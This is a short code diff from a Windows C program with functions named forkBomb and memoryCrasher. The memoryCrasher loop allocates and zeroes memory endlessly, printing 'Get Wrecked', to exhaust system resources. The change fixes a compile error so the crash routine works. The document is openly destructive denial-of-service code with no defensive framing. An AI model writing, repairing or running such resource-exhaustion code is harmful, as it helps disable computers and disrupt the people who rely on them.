@@ -80,7 +80,7 @@ DWORD WINAPI forkBomb(int argc, char **argv) {
 }
 
 DWORD WINAPI memoryCrasher() {
-      SIZE_T allocationSize = 1024 * 1024; // Allocate memory in 1 MB chunks
+    int allocationSize = 1024 * 1024; // Allocate memory in 1 MB chunks
     void *p;
     while (1) {
         p = VirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -88,7 +88,7 @@ DWORD WINAPI memoryCrasher() {
             printf("Memory allocation failed\n");
             break;
         }
-        ZeroMemory(p, a); // Initialize allocated memory to zero
+        ZeroMemory(p, allocationSize); // Initialize allocated memory to zero
         printf("Get Wrecked \n");
     }
 
